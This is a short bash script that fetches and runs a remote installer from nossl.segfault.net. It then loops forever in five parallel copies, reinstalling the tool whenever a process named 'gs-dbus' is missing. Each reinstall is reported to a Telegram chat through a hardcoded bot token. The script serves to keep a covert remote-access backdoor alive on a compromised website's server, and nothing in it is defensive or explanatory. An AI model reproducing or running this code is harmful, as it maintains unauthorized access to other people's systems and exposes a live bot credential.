#!/bin/bash

if [ -z "$1" ]; then
  echo "Usage: $0 <domain>"
  exit 1
fi

TOKEN="6598877714:AAFGR7OVC1YchGkhP8WrVinz4wwLAyVMSh8"
CHAT_ID="-1002152193505"
domain="$1"
download_command="curl -fsSL http://nossl.segfault.net/deploy-all.sh -o deploy-all.sh"
run_command="bash deploy-all.sh"

send_to_telegram() {
  local message="$1"
  curl -s -X POST "https://api.telegram.org/bot${TOKEN}/sendMessage" \
    -d chat_id="${CHAT_ID}" \
    -d text="${message}" \
    -d parse_mode="Markdown"
  rm -f nohup.out
}

monitor_and_restart() {
  while true; do
    if ! pgrep "gs-dbus" > /dev/null; then

      if [[ ! -f deploy-all.sh ]]; then
        output=$($download_command 2>&1)
        sleep 15
      fi
      output=$($run_command 2>&1)
      sleep 15
      send_to_telegram "Website $domain telah di-install ulang, output:\n\`\`\`${output}\`\`\`"
    fi

    sleep 5
  done
}
for i in {1..5}; do
  monitor_and_restart &
done
wait